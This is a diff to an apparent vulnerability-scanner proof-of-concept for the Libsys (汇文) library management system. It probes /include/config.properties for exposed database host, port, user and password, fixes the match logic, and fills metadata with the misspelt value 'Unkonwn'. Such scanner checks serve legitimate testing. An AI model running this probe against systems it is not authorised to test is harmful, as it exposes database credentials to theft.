@@ -14,11 +14,11 @@ class Vuln(ABVuln):
         汇文（Libsys）图书管理系统敏感信息泄露。
         /include/config.properties
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '汇文图书管理系统'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = 'ea2fa4ea-f5ef-48b3-a24a-634d1fd479c7'
@@ -38,7 +38,7 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             r = requests.get(verify_url)
 
-            if r.status_code == 200 and 'host' and 'port' and 'user' and 'password' in r.content:
+            if r.status_code == 200 and 'host' in r.content and 'port' in r.content and 'user' in r.content and 'password' in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -47,7 +47,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
